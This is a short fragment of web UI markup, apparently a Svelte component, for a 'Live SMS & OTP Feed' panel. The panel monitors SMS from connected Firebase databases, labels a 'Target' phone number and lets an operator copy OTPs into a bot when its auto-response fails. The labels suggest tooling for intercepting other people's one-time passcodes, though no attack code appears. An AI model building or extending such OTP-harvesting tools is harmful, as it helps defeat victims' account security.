...
<!-- Dedicated Full-Screen Live SMS & OTP Feed Tab -->
<section class="card sms-feed-dedicated-section">
  <div class="card-header">
    <div>
      <div class="flex items-center gap-2">
        <h2 class="card-title">Live SMS & OTP Feed — Real-Time Monitor</h2>
        <span class="feed-count-badge">
          {filteredSmsNotifications.length} of {dashboardNotifs.length}
        </span>
        {#if autoEngine.currentJob?.phone || autoEngine.workerStatus.phone}
          <span class="feed-target-badge">
            🎯 Target: {autoEngine.currentJob?.phone || autoEngine.workerStatus.phone}
          </span>
        {/if}
      </div>
      <p class="card-desc">
        Full monitoring feed for all incoming SMS messages across connected Firebase databases. Search or filter by keyword, copy OTPs with 1 click, or paste directly into the bot command box if bot auto-response fails.
      </p>
    </div>

    <div class="flex items-center gap-2">
      <button class="btn btn-secondary btn-sm" onclick={onsync} title="Sync new notifications now">
        Sync SMS ↺
      </button>
      <button class="btn btn-ghost btn-sm" onclick={onclear} title="Clear displayed notifications list">
        Clear Feed
      </button>
    </div>
  </div>
  ...
  <div class="sms-feed-list sms-feed-dedicated-list">
